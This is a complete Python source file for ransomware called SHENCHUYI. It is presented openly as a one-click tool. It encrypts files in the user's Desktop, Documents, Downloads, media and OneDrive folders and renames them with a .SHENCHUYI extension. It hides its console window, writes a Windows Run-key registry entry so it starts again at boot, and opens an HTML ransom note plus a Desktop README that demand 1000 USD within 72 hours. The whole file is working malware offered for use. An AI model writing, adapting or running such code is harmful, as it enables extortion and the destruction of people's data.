import os
import sys
import subprocess
import tempfile
import webbrowser
import ctypes
import time
import platform
from cryptography.fernet import Fernet

# =============================================================================
# STANDALONE / ONE-CLICK RANSOMWARE - SHENCHUYI
# Created by: ayyubi
# =============================================================================

# Constants
EXTENSION = ".SHENCHUYI"
RANSOM_NAME = "SHENCHUYI"
RANSOM_AMOUNT = "1000 USD"
CONTACT_EMAIL = "fatcatfatcat63@gmail.com"
AUTHOR = "ayyubi"

# Path for the key file
KEY_FILE = os.path.join(tempfile.gettempdir(), "shenchuyi_ransom_key.key")

# HTML ransom note content
RANSOM_HTML = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SHENCHUYI RANSOMWARE</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: 'Courier New', 'Consolas', monospace;
            background-color: #8B0000;
            background: linear-gradient(135deg, #8B0000 0%, #5C0000 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            padding: 20px;
        }}
        .container {{
            max-width: 800px;
            width: 100%;
            background: rgba(0,0,0,0.85);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.2);
            text-align: center;
        }}
        h1 {{
            font-size: 3rem;
            margin-bottom: 20px;
            letter-spacing: 4px;
            text-shadow: 3px 3px 0px #4a0000;
        }}
        .subtitle {{
            font-size: 0.9rem;
            color: #ffaaaa;
            margin-bottom: 30px;
            letter-spacing: 2px;
        }}
        .amount {{
            font-size: 2.5rem;
            font-weight: bold;
            color: #ff4444;
            background: rgba(0,0,0,0.5);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }}
        .email {{
            font-size: 1.3rem;
            background: #1a1a2a;
            padding: 12px;
            border-radius: 8px;
            margin: 20px 0;
            word-break: break-all;
        }}
        .warning {{
            background: rgba(255,0,0,0.3);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            font-size: 0.85rem;
            text-align: left;
        }}
        .warning ul {{
            margin-left: 20px;
            margin-top: 10px;
        }}
        .warning li {{
            margin: 8px 0;
        }}
        .footer {{
            margin-top: 30px;
            font-size: 0.7rem;
            color: #aaa;
            border-top: 1px solid #333;
            padding-top: 20px;
        }}
        .blink {{
            animation: blink 1s step-end infinite;
        }}
        @keyframes blink {{
            0%, 100% {{ opacity: 1; }}
            50% {{ opacity: 0; }}
        }}
        button {{
            background: #ff4444;
            border: none;
            padding: 12px 30px;
            font-size: 1rem;
            font-weight: bold;
            color: white;
            border-radius: 30px;
            cursor: pointer;
            margin-top: 20px;
        }}
        button:hover {{
            background: #cc0000;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>SHENCHUYI</h1>
        <div class="subtitle">RANSOMWARE</div>
        <div style="font-size: 1.2rem; margin: 20px 0;">
            YOUR FILES HAVE BEEN ENCRYPTED
        </div>
        <div class="amount">
            RANSOM: {RANSOM_AMOUNT}
        </div>
        <div class="email">
            CONTACT: {CONTACT_EMAIL}
        </div>
        <div class="warning">
            <strong>WHAT HAPPENED?</strong>
            <ul>
                <li>All your important files have been encrypted with AES-256 encryption</li>
                <li>Your files have been renamed with extension: <strong>.SHENCHUYI</strong></li>
                <li>You cannot access your documents, photos, databases, or other important files</li>
            </ul>
            <br>
            <strong>HOW TO RECOVER YOUR FILES?</strong>
            <ul>
                <li>Send <strong>{RANSOM_AMOUNT}</strong> in Bitcoin or USDT to the address provided upon contact</li>
                <li>Email us at: <strong>{CONTACT_EMAIL}</strong> with your personal ID code</li>
                <li>You will receive the decryption tool and your unique key</li>
            </ul>
            <br>
            <strong>WARNINGS:</strong>
            <ul>
                <li>DO NOT attempt to decrypt files yourself - permanent data loss may occur</li>
                <li>DO NOT rename or modify encrypted files</li>
                <li>DO NOT contact data recovery services - they will waste your time and money</li>
                <li>You have <span class="blink">72 HOURS</span> to pay, after which the key will be destroyed</li>
            </ul>
        </div>
        <div class="footer">
            SHENCHUYI RANSOMWARE | Created by: {AUTHOR} | AES-256 ENCRYPTION
        </div>
        <button onclick="window.close()">Close</button>
    </div>
</body>
</html>'''

# =============================================================================
# RANSOMWARE FUNCTIONS (Original Code - PRESERVED)
# =============================================================================

# Generate a key for encryption and decryption
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)


# Load the encryption key from file
def load_key():
    return open(KEY_FILE, "rb").read()


# Encrypt a file
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
        print(f"[+] {file_path} has been encrypted.")
        return True
    except Exception as e:
        print(f"[-] Failed to encrypt {file_path}: {e}")
        return False


# Decrypt a file (for demonstration purposes)
def decrypt_file(file_path, key):
    fernet = Fernet(key)
    try:
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = fernet.decrypt(encrypted_data)
        with open(file_path, "wb") as file:
            file.write(decrypted_data)
        print(f"[+] {file_path} has been decrypted.")
        return True
    except Exception as e:
        print(f"[-] Failed to decrypt {file_path}: {e}")
        return False


# Encrypt files in a directory
def encrypt_file_in_directory(directory, key):
    encrypted_count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            # Skip files that already have the extension
            if file_path.endswith(EXTENSION):
                continue
            # Skip system and program files
            skip_dirs = ['Windows', 'Program Files', 'Program Files (x86)', 'System32', 
                        'AppData', 'Microsoft', 'Temp', 'tmp', 'cache', 'Cache']
            skip = False
            for skip_dir in skip_dirs:
                if skip_dir.lower() in file_path.lower():
                    skip = True
                    break
            if skip:
                continue
            if encrypt_file(file_path, key):
                # Rename file with extension
                try:
                    os.rename(file_path, file_path + EXTENSION)
                except:
                    pass
                encrypted_count += 1
    return encrypted_count


# Rename all encrypted files to add extension (for files already encrypted)
def rename_files_with_extension(directory, key):
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if not file_path.endswith(EXTENSION):
                # Check if file is encrypted by trying to decrypt a small part
                try:
                    fernet = Fernet(key)
                    with open(file_path, "rb") as f:
                        test_data = f.read(100)
                    # If it's encrypted, fernet will raise an exception
                    fernet.decrypt(test_data)
                    # If we get here, it's encrypted but missing extension
                    os.rename(file_path, file_path + EXTENSION)
                    count += 1
                except:
                    pass
    return count


# =============================================================================
# RANSOM NOTE DISPLAY - Auto open browser
# =============================================================================

def show_ransom_note():
    """Create HTML ransom note and open in browser automatically"""
    html_path = os.path.join(tempfile.gettempdir(), "SHENCHUYI_RANSOM_NOTE.html")
    
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(RANSOM_HTML)
    
    # Try to open in different browsers
    browsers = [
        'chrome', 'google-chrome', 'chrome.exe',
        'firefox', 'firefox.exe', 
        'msedge', 'microsoft-edge', 'msedge.exe',
        'opera', 'opera.exe',
        'brave', 'brave.exe'
    ]
    
    opened = False
    for browser in browsers:
        try:
            if platform.system() == "Windows":
                subprocess.Popen([browser, html_path], shell=True)
            else:
                subprocess.Popen([browser, html_path])
            opened = True
            break
        except:
            continue
    
    if not opened:
        webbrowser.open(html_path)


# =============================================================================
# CREATE README FILE
# =============================================================================

def create_readme(encrypted_count):
    """Create README file on Desktop"""
    readme_content = f"""
================================================================================
                        SHENCHUYI RANSOMWARE
================================================================================

[!] YOUR FILES HAVE BEEN ENCRYPTED [!]

Total files encrypted: {encrypted_count}
Encrypted extension: .SHENCHUYI

================================================================================
                          WHAT HAPPENED?
================================================================================

All your important files have been encrypted with AES-256 encryption.
The encryption key is unique to your system.

You cannot decrypt your files without our decryption key.

================================================================================
                        HOW TO RECOVER FILES?
================================================================================

To recover your files, you need to pay a ransom of:
                    {RANSOM_AMOUNT}

Payment instructions:
1. Contact: {CONTACT_EMAIL}
2. Send proof of payment
3. You will receive the decryption key and tool

================================================================================
                            WARNINGS
================================================================================

- DO NOT attempt to decrypt files yourself (will cause permanent data loss)
- DO NOT rename or modify encrypted files
- DO NOT contact data recovery services (they will waste your time and money)
- You have 72 HOURS to pay (after that, the key will be destroyed)

================================================================================
                    CONTACT FOR DECRYPTION
================================================================================

Email: {CONTACT_EMAIL}
Subject: [SHENCHUYI] - YOUR_COMPUTER_NAME

================================================================================
Created by: {AUTHOR}
"""
    
    desktop = os.path.join(os.path.expanduser("~"), "Desktop", "SHENCHUYI_README.txt")
    try:
        with open(desktop, 'w', encoding='utf-8') as f:
            f.write(readme_content)
    except:
        pass


# =============================================================================
# PERSISTENCE - Auto start on boot
# =============================================================================

def add_to_startup():
    """Add ransomware to Windows startup"""
    try:
        if platform.system() == "Windows":
            import winreg
            current_file = sys.argv[0]
            
            if getattr(sys, 'frozen', False):
                current_file = sys.executable
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "SHENCHUYI", 0, winreg.REG_SZ, current_file)
    except:
        pass


# =============================================================================
# GET TARGET DIRECTORIES
# =============================================================================

def get_target_directories():
    """Get target directories for encryption"""
    user_profile = os.path.expanduser("~")
    target_dirs = [
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Documents"),
        os.path.join(user_profile, "Downloads"),
        os.path.join(user_profile, "Pictures"),
        os.path.join(user_profile, "Music"),
        os.path.join(user_profile, "Videos")
    ]
    
    # Filter only existing directories
    return [d for d in target_dirs if os.path.exists(d)]


# =============================================================================
# HIDE CONSOLE (for Windows)
# =============================================================================

def hide_console():
    """Hide console window on Windows"""
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass


# =============================================================================
# MAIN FUNCTION (Original + Enhanced)
# =============================================================================

def main():
    # Hide console for stealth
    hide_console()
    
    # Add to startup for persistence
    add_to_startup()
    
    print("=" * 60)
    print("SHENCHUYI RANSOMWARE")
    print(f"Created by: {AUTHOR}")
    print("=" * 60)
    
    # Generate encryption key if it does not exist
    if not os.path.exists(KEY_FILE):
        generate_key()
        print("[*] Encryption key generated.")
    
    key = load_key()
    print("[*] Key loaded, Encrypting files...")
    
    total_encrypted = 0
    target_directories = get_target_directories()
    
    # Encrypt files in all target directories
    for directory in target_directories:
        if os.path.exists(directory):
            print(f"[*] Encrypting: {directory}")
            encrypted = encrypt_file_in_directory(directory, key)
            total_encrypted += encrypted
    
    # Also check common user directories
    user_profile = os.path.expanduser("~")
    extra_dirs = [os.path.join(user_profile, "OneDrive")]
    for directory in extra_dirs:
        if os.path.exists(directory):
            encrypted = encrypt_file_in_directory(directory, key)
            total_encrypted += encrypted
    
    print(f"[*] Total files encrypted: {total_encrypted}")
    
    # Create README on Desktop
    create_readme(total_encrypted)
    
    # Show ransom note in browser
    if total_encrypted > 0:
        print("[*] Showing ransom note...")
        time.sleep(1)
        show_ransom_note()
    
    print("[*] SHENCHUYI Ransomware execution completed.")
    
    # Keep the program running (optional)
    time.sleep(300)  # Keep running for 5 minutes


# =============================================================================
# DECRYPT FUNCTION (for recovery - commented by default)
# =============================================================================

def decrypt_all():
    """Decrypt all encrypted files (for recovery purposes)"""
    print("=" * 60)
    print("SHENCHUYI DECRYPTION UTILITY")
    print("=" * 60)
    
    if not os.path.exists(KEY_FILE):
        print("[!] Key file not found. Cannot decrypt.")
        return
    
    key = load_key()
    total_decrypted = 0
    
    target_directories = get_target_directories()
    for directory in target_directories:
        if os.path.exists(directory):
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if file.endswith(EXTENSION):
                        file_path = os.path.join(root, file)
                        original_path = file_path[:-len(EXTENSION)]
                        if decrypt_file(file_path, key):
                            try:
                                os.rename(file_path, original_path)
                                total_decrypted += 1
                            except:
                                pass
    
    print(f"[*] Total files decrypted: {total_decrypted}")


# =============================================================================
# ENTRY POINT
# =============================================================================

if __name__ == "__main__":
    # Check for decrypt mode (for recovery only)
    if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
        decrypt_all()
    else:
        main()